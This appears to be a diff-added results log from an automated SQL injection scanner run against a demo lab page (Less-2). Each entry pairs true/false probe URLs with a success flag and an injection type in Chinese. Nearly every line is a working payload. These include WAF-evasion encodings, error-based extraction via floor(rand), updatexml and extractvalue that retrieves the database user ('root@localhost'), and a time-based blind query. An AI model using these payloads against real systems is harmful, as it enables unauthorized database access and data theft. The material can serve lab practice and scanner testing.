+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1^-----http://demo.sqli.com/Less-2/?id=1^', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1!-----http://demo.sqli.com/Less-2/?id=1!', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1[-----http://demo.sqli.com/Less-2/?id=1[', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/xor/***/1-----http://demo.sqli.com/Less-2/?id=1/***/xor/***/0', 'success': 'True', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dand%0b%0c%0b%0d1 like 1-----http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dand%0b%0c%0b%0d1 like 2', 'success': 'True', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%20xor%20/*!and/*/**//*!/*!1*/-----http://demo.sqli.com/Less-2/?id=1%20xor%20/*!and/*/**//*!/*!0*/', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%a0and%a0{``1=1}-----http://demo.sqli.com/Less-2/?id=1%a0and%a0{``1=2}', 'success': 'Maybe', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 xor 1-----http://demo.sqli.com/Less-2/?id=1 xor 0', 'success': 'True', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 xor 2<<1-----http://demo.sqli.com/Less-2/?id=1 xor 0<<2', 'success': 'True', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%20and%201|1-----http://demo.sqli.com/Less-2/?id=1%20and%200|0', 'success': 'True', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%a0xor%a01||1-----http://demo.sqli.com/Less-2/?id=1%a0xor%a00||0', 'success': 'Maybe', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%a0and%a01&&1-----http://demo.sqli.com/Less-2/?id=1%a0and%a00&&1', 'success': 'Maybe', 'type': '数字型'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 xor 1^1-----http://demo.sqli.com/Less-2/?id=1 xor 1^0', 'success': 'True', 'type': '数字型'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%a0and%a01%23-----http://demo.sqli.com/Less-2/?id=1'%a0and%a00%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' xor 1 like 1%23-----http://demo.sqli.com/Less-2/?id=1' xor 1 like 2%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dand%0b%0c%0b%0d/*!and/*/**//*!/*!1*/%23-----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dand%0b%0c%0b%0d/*!and/*/**//*!/*!0*/%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'/***/and/***/{``1=1}%23-----http://demo.sqli.com/Less-2/?id=1'/***/and/***/{``1=2}%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%09and%091%23-----http://demo.sqli.com/Less-2/?id=1'%09and%090%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d2<<1--+-----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d0<<2--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d1|1--+-----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d0|0--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dand%0b%0c%0b%0d1||1%23-----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dand%0b%0c%0b%0d0||0%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%20xor%201&&1--+-----http://demo.sqli.com/Less-2/?id=1'%20xor%200&&1--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' xor 1^1%23-----http://demo.sqli.com/Less-2/?id=1' xor 1^0%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0xor%a01%23-----http://demo.sqli.com/Less-2/?id=1"%a0xor%a00%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%09and%091 like 1%23-----http://demo.sqli.com/Less-2/?id=1"%09and%091 like 2%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%20and%20/*!and/*/**//*!/*!1*/ -----http://demo.sqli.com/Less-2/?id=1"%20and%20/*!and/*/**//*!/*!0*/ ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0and%a0{``1=1}%23-----http://demo.sqli.com/Less-2/?id=1"%a0and%a0{``1=2}%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%0b%0c%0b%0dxor%0b%0c%0b%0d1 -----http://demo.sqli.com/Less-2/?id=1"%0b%0c%0b%0dxor%0b%0c%0b%0d0 ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0xor%a02<<1%23-----http://demo.sqli.com/Less-2/?id=1"%a0xor%a00<<2%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0xor%a01|1 -----http://demo.sqli.com/Less-2/?id=1"%a0xor%a00|0 ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%09and%091||1%23-----http://demo.sqli.com/Less-2/?id=1"%09and%090||0%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%09xor%091&&1 -----http://demo.sqli.com/Less-2/?id=1"%09xor%090&&1 ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0xor%a01^1%23-----http://demo.sqli.com/Less-2/?id=1"%a0xor%a01^0%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%09xor%091%23-----http://demo.sqli.com/Less-2/?id=1\\%09xor%090%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20and%201 like 1%23-----http://demo.sqli.com/Less-2/?id=1\\%20and%201 like 2%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20xor%20/*!and/*/**//*!/*!1*/--+-----http://demo.sqli.com/Less-2/?id=1\\%20xor%20/*!and/*/**//*!/*!0*/--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\ and {``1=1} -----http://demo.sqli.com/Less-2/?id=1\\ and {``1=2} ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20and%201--+-----http://demo.sqli.com/Less-2/?id=1\\%20and%200--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20xor%202<<1--+-----http://demo.sqli.com/Less-2/?id=1\\%20xor%200<<2--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\ and 1|1--+-----http://demo.sqli.com/Less-2/?id=1\\ and 0|0--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%0b%0c%0b%0dand%0b%0c%0b%0d1||1%23-----http://demo.sqli.com/Less-2/?id=1\\%0b%0c%0b%0dand%0b%0c%0b%0d0||0%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%0b%0c%0b%0dand%0b%0c%0b%0d1&&1 -----http://demo.sqli.com/Less-2/?id=1\\%0b%0c%0b%0dand%0b%0c%0b%0d0&&1 ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\ and 1^1 -----http://demo.sqli.com/Less-2/?id=1\\ and 1^0 ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%20xor%201--+-----http://demo.sqli.com/Less-2/?id=1')%20xor%200--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%20xor%201 like 1--+-----http://demo.sqli.com/Less-2/?id=1')%20xor%201 like 2--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')/***/and/***//*!and/*/**//*!/*!1*/ -----http://demo.sqli.com/Less-2/?id=1')/***/and/***//*!and/*/**//*!/*!0*/ ", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')/***/xor/***/{``1=1}%23-----http://demo.sqli.com/Less-2/?id=1')/***/xor/***/{``1=2}%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%0b%0c%0b%0dxor%0b%0c%0b%0d1%23-----http://demo.sqli.com/Less-2/?id=1')%0b%0c%0b%0dxor%0b%0c%0b%0d0%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')/***/xor/***/2<<1%23-----http://demo.sqli.com/Less-2/?id=1')/***/xor/***/0<<2%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%20xor%201|1--+-----http://demo.sqli.com/Less-2/?id=1')%20xor%200|0--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1') xor 1||1--+-----http://demo.sqli.com/Less-2/?id=1') xor 0||0--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%09and%091&&1 -----http://demo.sqli.com/Less-2/?id=1')%09and%090&&1 ", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1') and 1^1 -----http://demo.sqli.com/Less-2/?id=1') and 1^0 ", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%09and%091--+-----http://demo.sqli.com/Less-2/?id=1")%09and%090--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%a0xor%a01 like 1%23-----http://demo.sqli.com/Less-2/?id=1")%a0xor%a01 like 2%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")/***/and/***//*!and/*/**//*!/*!1*/%23-----http://demo.sqli.com/Less-2/?id=1")/***/and/***//*!and/*/**//*!/*!0*/%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d{``1=1}--+-----http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d{``1=2}--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1") and 1--+-----http://demo.sqli.com/Less-2/?id=1") and 0--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d2<<1 -----http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d0<<2 ', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%a0and%a01|1%23-----http://demo.sqli.com/Less-2/?id=1")%a0and%a00|0%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")/***/and/***/1||1--+-----http://demo.sqli.com/Less-2/?id=1")/***/and/***/0||0--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%20and%201&&1%23-----http://demo.sqli.com/Less-2/?id=1")%20and%200&&1%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%20and%201^1%23-----http://demo.sqli.com/Less-2/?id=1")%20and%201^0%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+', 'success': 'True', 'type': '报错型', 'user': 'root@localhost'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)%23', 'success': 'True', 'type': '报错型', 'user': 'root@localhost'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x %23', 'success': 'True', 'type': '报错型', 'user': 'root@localhost'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+', 'success': 'True', 'type': '报错型', 'user': 'root@localhost'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))%23', 'success': 'True', 'type': '报错型', 'user': 'root@localhost'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)%23-----http://demo.sqli.com/Less-2/?id=1" and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)%23', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)--+-----http://demo.sqli.com/Less-2/?id=1" and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+-----http://demo.sqli.com/Less-2/?id=1" union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+-----http://demo.sqli.com/Less-2/?id=1" and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+-----http://demo.sqli.com/Less-2/?id=1" and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)%23-----http://demo.sqli.com/Less-2/?id=1' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)%23-----http://demo.sqli.com/Less-2/?id=1' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)%23", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+-----http://demo.sqli.com/Less-2/?id=1' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+-----http://demo.sqli.com/Less-2/?id=1' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+-----http://demo.sqli.com/Less-2/?id=1' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and sleep( if( (select length(database()) = 8) , 5, 0 ) )--+', 'success': 'True', 'type': '盲注'}
